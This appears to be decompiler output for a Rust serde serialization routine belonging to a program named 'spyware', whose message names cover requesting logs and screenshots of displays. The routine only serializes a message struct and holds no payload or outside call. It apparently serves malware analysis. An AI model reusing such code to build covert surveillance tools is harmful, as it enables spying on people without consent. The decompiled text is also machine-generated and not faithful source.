long long spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::GetLogsRequest>::serialize(struct_0 *a0, unsigned long a1, unsigned long long a2)
{
    char v0;  // [bp-0x38], Other Possible Types: unsigned int
    unsigned int v1;  // [bp-0x34]
    unsigned long v2;  // [bp-0x30], Other Possible Types: unsigned long long
    char v3;  // [bp-0x28]
    char v4;  // [bp-0x27]
    char v5;  // [bp-0x18]

    v0.serialize_struct(a2, "GetLogsRequestGetLogsResponseGetScreenshotRequestDisplayScreenshotbufferwidthheightGetScreenshotResponsedisplays_screenshotsMessage", 14, 0);
    if (v0 == 33)
    {
        a0.end(v2, v3);
    }
    else
    {
        *((int128_t *)&a0->field_11[15]) = *((int128_t *)&v5);
        *((int128_t *)&a0->field_11[0]) = *((int128_t *)&v4);
        a0->field_0 = v0;
        a0->field_4 = v1;
        a0->field_8 = v2;
        a0->field_10 = v3;
    }
    return a0;
}
